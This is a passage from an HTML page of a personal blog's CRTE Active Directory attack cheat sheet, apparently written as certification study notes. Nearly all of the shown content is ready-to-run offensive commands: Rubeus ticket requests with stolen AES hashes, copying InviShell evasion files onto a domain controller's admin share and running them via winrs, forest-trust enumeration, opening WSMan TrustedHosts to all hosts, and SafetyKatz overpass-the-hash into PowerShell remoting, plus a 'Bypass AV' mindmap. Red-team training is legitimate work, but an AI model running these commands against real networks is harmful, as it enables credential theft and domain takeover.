</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/aes256:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/dc:</span><span class="err">&lt;</span><span class="nx">dc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/createnetonly:C:\Windows\System32\cmd.exe</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\InShellProf.dll</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\InShellProf.dll</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">\\dc.domain.local\C</span><span class="err">$</span><span class="nx">\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc.domain.local</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">C:\Users\Public\RunWithRegistryNonAdmin.bat</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Enumerate other Forests</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADTrust</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{(</span><span class="n">ForestTransitive</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$True</span><span class="p">)</span><span class="w"> </span><span class="o">-and</span><span class="w"> </span><span class="p">(</span><span class="n">SIDFilteringQuarantined</span><span class="w"> </span><span class="o">-eq</span><span class="w"> </span><span class="nv">$False</span><span class="p">)}</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="n">production.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Search for</strong>:</p>

      <ul>
        <li>ForestTransitive : True</li>
        <li>SIDFilteringForestAware : True</li>
      </ul>

      <p><strong>Check the membership of Shadow Security Principals</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="p">(</span><span class="s2">"CN=Shadow Principal Configuration,CN=Services,"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">(</span><span class="n">Get-ADRootDSE</span><span class="p">)</span><span class="o">.</span><span class="nf">configurationNamingContext</span><span class="p">)</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="w"> </span><span class="nx">member</span><span class="p">,</span><span class="w"> </span><span class="nx">msDS-ShadowPrincipalSid</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Obtain the IP of Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DnsServerZone</span><span class="w"> </span><span class="nt">-ZoneName</span><span class="w"> </span><span class="nx">production.local</span><span class="w"> </span><span class="o">|</span><span class="n">fl</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Modify WSMan Trustedhosts property</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Note:</span><span class="w"> </span><span class="nx">Run</span><span class="w"> </span><span class="nx">from</span><span class="w"> </span><span class="nx">an</span><span class="w"> </span><span class="nx">elevated</span><span class="w"> </span><span class="nx">shell</span><span class="w">
</span><span class="n">Set-Item</span><span class="w"> </span><span class="nx">WSMan:\localhost\Client\TrustedHosts</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Use PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:administrator /domain:domain.local /ntlm:&lt;hash&gt; /run:powershell.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nx">192.168.102.1</span><span class="w"> </span><span class="nt">-Authentication</span><span class="w"> </span><span class="nx">NegotiateWithImplicitCredential</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Mindmaps</summary>
    <div class="content">
      <p> </p>

      <p>AD Mindmap:</p>

      <p><img src="/assets/images/posts/crte/6.png" alt="Alt text" class="align-center" /></p>

      <p>AD Recommendations:</p>

      <p><img src="/assets/images/posts/crte/7.png" alt="Alt text" class="align-center" /></p>

      <p>DACL:</p>

      <p><img src="/assets/images/posts/crte/8.png" alt="Alt text" class="align-center" /></p>

      <p>Bypass AV:</p>

      <p><img src="/assets/images/posts/crte/9.png" alt="Alt text" class="align-center" /></p>

      <p>Bloodhound Collector:</p>

      <p><img src="/assets/images/posts/crte/10.png" alt="Alt text" class="align-center" /></p>

    </div>
  </details>
</div>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#ad" class="page__taxonomy-item" rel="tag">AD</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#cheatsheet" class="page__taxonomy-item" rel="tag">cheatsheet</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#intermediate" class="page__taxonomy-item" rel="tag">intermediate</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#crte" class="page__taxonomy-item" rel="tag">crte</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-12-31T00:00:00+06:00">December 31, 2023</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=5+-+Cheat+Sheet%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcheatsheet%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcheatsheet%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fcrte%2Fcheatsheet%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/notes/crte/cross/" class="pagination--pager" title="4 - Cross Domain Attacks
">Previous</a>
    
    
      <a href="/insights/roadmap/" class="pagination--pager" title="How to become a Pentester (2024)
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">

    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>





  
    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
  
    <script src="/assets/js/clipboard.js"></script>
  



  </body>
</html>
